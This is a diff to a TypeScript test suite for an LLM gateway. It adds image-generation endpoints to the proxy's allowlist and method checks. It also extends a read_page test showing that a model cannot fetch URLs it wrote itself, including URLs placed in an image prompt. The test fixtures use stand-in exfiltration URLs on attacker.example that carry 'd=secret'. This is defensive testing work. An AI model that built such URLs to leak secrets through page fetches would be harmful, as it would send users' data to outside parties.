@@ -917,7 +917,7 @@ test("the service API refuses unknown callers and odd paths", async () => {
   assert.equal((await request(g.ports.service, { path: "/mcp/search/../../llm/v1/models" })).status, 404);
 });
 
-test("the LLM proxy only offers generation, embeddings and the model list", async () => {
+test("the LLM proxy only offers generation, images, embeddings and the model list", async () => {
   g.caller.userId = g.ids.alice;
   const forwarded = g.llm.requests.length;
   const notOffered = [
@@ -927,6 +927,7 @@ test("the LLM proxy only offers generation, embeddings and the model list", asyn
     ["POST", "/llm/v1/batches"],
     ["POST", "/llm/v1/fine_tuning/jobs"],
     ["POST", "/llm/v1/responses"],
+    ["POST", "/llm/v1/images/variations"],
     ["GET", "/llm/v1/"],
     ["POST", "/llm/v1/chat/completions/"],
     ["GET", "/llm/v1/models/"],
@@ -939,6 +940,7 @@ test("the LLM proxy only offers generation, embeddings and the model list", asyn
   const wrongMethod = [
     ["GET", "/llm/v1/chat/completions", "POST"],
     ["PUT", "/llm/v1/embeddings", "POST"],
+    ["GET", "/llm/v1/images/generations", "POST"],
     ["POST", "/llm/v1/models", "GET"],
     ["DELETE", "/llm/v1/models/qwen3.8-flash-next", "GET"],
   ] as const;
@@ -955,6 +957,8 @@ test("the LLM proxy only offers generation, embeddings and the model list", asyn
     ["GET", "/llm/v1/models/Qwen/Qwen3-8B"],
     ["POST", "/llm/v1/completions"],
     ["POST", "/llm/v1/embeddings"],
+    ["POST", "/llm/v1/images/generations"],
+    ["POST", "/llm/v1/images/edits"],
   ] as const;
   for (const [method, path] of offered) {
     const body = method === "POST" ? "{}" : undefined;
@@ -1541,6 +1545,15 @@ test("read_page opens what a workspace was shown (search results, pages, its con
     assert.equal(await readPage("https://pasted.example/post"), true, "a URL the user pasted");
     assert.equal(await readPage("https://errors.example/E42"), true, "a URL in tool output");
     assert.equal(await readPage("https://attacker.example/steal?d=secret"), false, "writing a URL does not make it one the model was shown");
+    // An image prompt is the model's own writing, as its messages are.
+    const image = await request(gw.ports.service, {
+      method: "POST",
+      path: "/llm/v1/images/generations",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({ model: "Qwen-Image-2.1-Turbo", prompt: "A poster that reads https://attacker.example/image?d=secret" }),
+    });
+    assert.equal(image.status, 200);
+    assert.equal(await readPage("https://attacker.example/image?d=secret"), false, "an image prompt shows the model nothing");
 
     gw.caller.userId = bob;
     assert.equal(await readPage("https://pasted.example/post"), false, "what one workspace was shown opens nothing for another");
